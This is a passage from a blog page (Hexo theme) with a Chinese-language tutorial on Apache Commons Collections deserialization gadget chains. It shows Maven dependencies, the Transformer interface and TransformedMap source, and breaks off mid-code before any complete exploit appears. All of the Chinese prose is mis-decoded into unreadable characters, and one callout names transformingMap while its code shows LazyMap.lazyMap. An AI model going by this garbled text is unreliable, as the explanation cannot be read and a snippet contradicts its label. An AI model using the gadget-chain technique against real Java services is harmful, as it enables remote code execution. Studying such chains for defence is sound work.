<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2025/10/21/java å¸¸è§ç»„ä»¶/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/null" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/null">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/null">
    <!--- Page Info-->
    
    <title>
        
            Java å¸¸è§ç»„ä»¶ | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"æ¨èé˜…è¯»","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["ä¹¦æœ‰æœªæ›¾ç»æˆ‘è¯»ï¼Œäº‹æ— ä¸å¯å¯¹äººè¨€"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"åˆ†ç±»":{"icon":"fa-solid fa-folder","path":"/categories/"},"æ ‡ç­¾":{"icon":"fa-solid fa-tags","path":"/tags/"},"ä¹¦ç­¾":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    åˆ†ç±»
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    æ ‡ç­¾
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/bookmarks/"
                                        >
                                    <i class="fa-solid fa-bookmark fa-fw"></i>
                                    ä¹¦ç­¾
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                åˆ†ç±»
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                æ ‡ç­¾
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/bookmarks/"
                        >
                            <span>
                                ä¹¦ç­¾
                            </span>
                            
                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">13</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">16</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">55</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Java å¸¸è§ç»„ä»¶</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/icon.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-10-21 22:46:30</span>
        <span class="mobile">2025-10-21 22:46:30</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-10-28 12:49:53</span>
            <span class="mobile">2025-10-28 12:49:53</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/web/">web</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/web/java-web/">java web</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/java-web/">java web</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>55.6k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>272 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="Commons-Collections"><a href="#Commons-Collections" class="headerlink" title="Commons Collections"></a>Commons Collections</h1><p>Apache Commons Collections æ˜¯â¼€ä¸ªè‘—åçš„è¾…åŠ©å¼€å‘åº“ï¼ŒåŒ…å«äº†ä¸€äº› Java ä¸­æ²¡æœ‰çš„æ•°æ®ç»“æ„å’Œå’Œè¾…åŠ©æ–¹æ³•ï¼Œä¸è¿‡éšç€ Java 9 ä»¥åçš„ç‰ˆæœ¬ä¸­åŸç”Ÿåº“åŠŸèƒ½çš„ä¸°å¯Œï¼Œä»¥åŠååºåˆ—åŒ–æ¼æ´çš„å½±å“ï¼Œå®ƒä¹Ÿåœ¨é€æ¸è¢«å‡çº§æˆ–æ›¿ä»£ã€‚</p>
<p>åœ¨ 2015 å¹´åº• commons-collections ååºåˆ—åŒ–åˆ©ç”¨é“¾è¢«æå‡ºæ—¶ï¼ŒApache Commons Collections æœ‰ä»¥ä¸‹ä¸¤ä¸ªåˆ†æ”¯ç‰ˆæœ¬ï¼š</p>
<ul>
<li><code>commons-collections:commons-collections</code></li>
<li><code>org.apache.commons:commons-collections4</code></li>
</ul>
<p>å‰è€…æ˜¯ Commons Collections è€çš„ç‰ˆæœ¬åŒ…ï¼Œå½“æ—¶ç‰ˆæœ¬å·æ˜¯ 3.2.1ï¼›åè€…æ˜¯å®˜æ–¹åœ¨ 2013 å¹´æ¨å‡ºçš„ 4 ç‰ˆæœ¬ï¼Œå½“æ—¶ç‰ˆæœ¬å·æ˜¯ 4.0ã€‚</p>
<p>å› ä¸ºå®˜æ–¹è®¤ä¸ºæ—§çš„ commons-collections æœ‰â¼€äº›æ¶æ„å’Œ API è®¾è®¡ä¸Šçš„é—®é¢˜ï¼Œä½†ä¿®å¤è¿™äº›é—®é¢˜ï¼Œä¼šäº§ç”Ÿå¤§é‡ä¸èƒ½å‘å‰å…¼å®¹çš„æ”¹åŠ¨ã€‚æ‰€ä»¥ï¼Œcommons-collections4 ä¸å†è®¤ä¸ºæ˜¯ä¸€ä¸ªç”¨æ¥æ›¿æ¢ commons-collections çš„æ–°ç‰ˆæœ¬ï¼Œè€Œæ˜¯ä¸€ä¸ªæ–°çš„åŒ…ï¼Œä¸¤è€…çš„å‘½åç©ºé—´ä¸å†²çªï¼Œå› æ­¤å¯ä»¥å…±å­˜åœ¨åŒä¸€ä¸ªé¡¹ç›®ä¸­ã€‚</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons/collections --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons/collections4 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p><code>Transformer</code> æ˜¯ä¸€ä¸ªæ¥å£ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªæ¥å£åªæœ‰ä¸€ä¸ª <code>transform</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    Object <span class="title function_">transform</span><span class="params">(Object var1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>Transformer</code> å¯ä»¥è¯´æ˜¯ CC é“¾çš„æ ¸å¿ƒï¼Œ<del>å‡ ä¹</del>æ‰€æœ‰çš„ CC é“¾éƒ½ä¾èµ–äº <code>Transformer</code>ã€‚æˆ‘ä»¬å¯ä»¥ç®€å•çš„æŠŠ CC é“¾æ€»ç»“ä¸ºï¼š<strong>å¯»æ‰¾ä¸€ä¸ªç±»ï¼Œè¿™ä¸ªç±»è‡ªå®šä¹‰çš„ <code>readObject</code> æ–¹æ³•ä¼šç›´æ¥æˆ–é—´æ¥çš„è§¦å‘å¯¹æŒ‡å®š <code>Transformer</code> å¯¹è±¡è°ƒç”¨ <code>transform</code> æ–¹æ³•çš„ä»£ç ã€‚</strong></p>
<p>ç”±äºæˆ‘ä»¬å¯ä»¥ç”¨ä¸€ç³»åˆ— <code>Transformer</code> æ¥å£å®ç°ç±»å®ç°ä»£ç æ‰§è¡Œæµçš„å®Œå…¨æ§åˆ¶ï¼Œå› æ­¤å½“è°ƒç”¨ <code>transform</code> æ–¹æ³•çš„æ—¶å€™ï¼Œå°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„ä»£ç ã€‚</p>
<h3 id="è°ƒç”¨-transform-æ–¹æ³•çš„å¯¹è±¡"><a href="#è°ƒç”¨-transform-æ–¹æ³•çš„å¯¹è±¡" class="headerlink" title="è°ƒç”¨ transform æ–¹æ³•çš„å¯¹è±¡"></a>è°ƒç”¨ transform æ–¹æ³•çš„å¯¹è±¡</h3><h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p><code>TransformedMap</code> ç”¨äºå¯¹ Java æ ‡å‡†æ•°æ®ç»“æ„ Map åšä¸€ä¸ªä¿®é¥°ï¼Œè¢«ä¿®é¥°è¿‡çš„ <code>Map</code> åœ¨æ·»åŠ ï¼ˆå†™å…¥æ“ä½œï¼‰æ–°çš„å…ƒç´ æ—¶ï¼Œå°†å¯ä»¥æ‰§è¡Œä¸€ä¸ªå›è°ƒã€‚æˆ‘ä»¬é€šè¿‡ä¸‹é¢è¿™è¡Œä»£ç å¯¹ <code>innerMap</code> è¿›è¡Œä¿®é¥°ï¼Œä¼ å‡ºçš„ <code>outerMap</code> å³æ˜¯ä¿®é¥°åçš„ <code>Map</code>ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, keyTransformer, valueTransformer);</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æ³¨æ„</p>

    </div>
    <div class="notel-content markdown-body">
      <p>åœ¨ Common-Collections4 ä¸­ <code>decorate</code> æ–¹æ³•æ”¹åä¸º <code>transformingMap</code>ï¼Œä½†æ˜¯åœ¨å®ç°ä¸Šæ²¡æœ‰å˜åŒ–ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.lazyMap(innerMap, transformerChain)</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p><code>TransformedMap#decorate</code> å‡½æ•°æ˜¯ä¸€ä¸ªå·¥å‚æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šå®ä¾‹åŒ–ä¸€ä¸ª <code>TransformedMap</code> å¯¹è±¡ï¼Œå¹¶ä¸”æ ¹æ®å‚æ•°è®¾ç½® <code>keyTransformer</code> å’Œ <code>valueTransformer</code> æˆå‘˜ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨çˆ¶ç±»æ„é€ å™¨åŒ…è£…åŸå§‹ Map</span></span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="comment">// ä¿å­˜è½¬æ¢å™¨ï¼ˆå¯ä¸º nullï¼Œè¡¨ç¤ºä¸è½¬æ¢ï¼‰</span></span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¦å¤– <code>TransformedMap</code> æ„é€ å‡½æ•°è¿˜ä¼šè°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°ï¼Œè€Œ <code>TransformedMap</code> æœ‰å¦‚ä¸‹ç»§æ‰¿å…³ç³»ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/10/21/Java%20%E5%B8%B8%E8%A7%81%E7%BB%84%E4%BB%B6/images/TransformedMap.png"
                      alt="TransformedMap"
                ></p>
<p>å…¶ä¸­åœ¨ <code>AbstractMapDecorator</code> çš„æ„é€ å‡½æ•°ä¸­ä¼šè®¾ç½® <code>map</code> æˆå‘˜ï¼Œä¹Ÿå°±æ˜¯ä¿å­˜è¢«ä¿®é¥°çš„ <code>Map</code>ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractMapDecorator</span><span class="params">(Map map)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (map == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Map must not be null&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.map = map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¢«ä¿®é¥°åçš„ <code>outerMap</code> åœ¨å­˜å‚¨æ–°å…ƒç´ æ—¶ï¼Œå°±ä¼šè°ƒç”¨ <code>transform</code> æ–¹æ³•å¯¹é”®å€¼å¯¹åšä¸€ä¸ªè½¬æ¢ã€‚è¿™ä¸ªè¿‡ç¨‹å°±ç±»ä¼¼åœ¨è°ƒç”¨â¼€ä¸ªâ€œå›è°ƒå‡½æ•°â€ï¼Œè¿™ä¸ªå›è°ƒçš„å‚æ•°æ˜¯åŸå§‹å¯¹è±¡ã€‚</p>
<p>ä¾‹å¦‚ <code>TransformedMap.put</code> æ–¹æ³•ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformKey</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (keyTransformer == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> object;  <span class="comment">// æ— è½¬æ¢å™¨ï¼Œè¿”å›åŸå§‹ key</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> keyTransformer.transform(object);  <span class="comment">// 